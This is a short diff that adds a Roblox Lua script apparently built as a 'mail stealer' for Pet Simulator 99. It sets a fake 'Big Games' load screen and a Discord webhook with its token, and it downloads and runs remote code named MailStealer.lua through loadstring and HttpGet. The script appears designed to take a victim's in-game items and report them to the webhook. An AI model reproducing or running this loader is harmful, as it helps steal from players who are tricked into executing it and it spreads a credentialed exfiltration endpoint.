@@ -1,0 +1,4 @@
+Username = " Purple_finish "
+LoadScreen = Big Games 
+Webhook = " https://discord.com/api/webhooks/1221035215930265610/VeJW4Z0LVpl31IUshJI9yhyZ7zoeYang5SKG9RccunytKrzgBWLzAdX4DqfDeTromiYP"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Purple_finish/PS99_Mailstealer/main/MailStealer.lua"))()
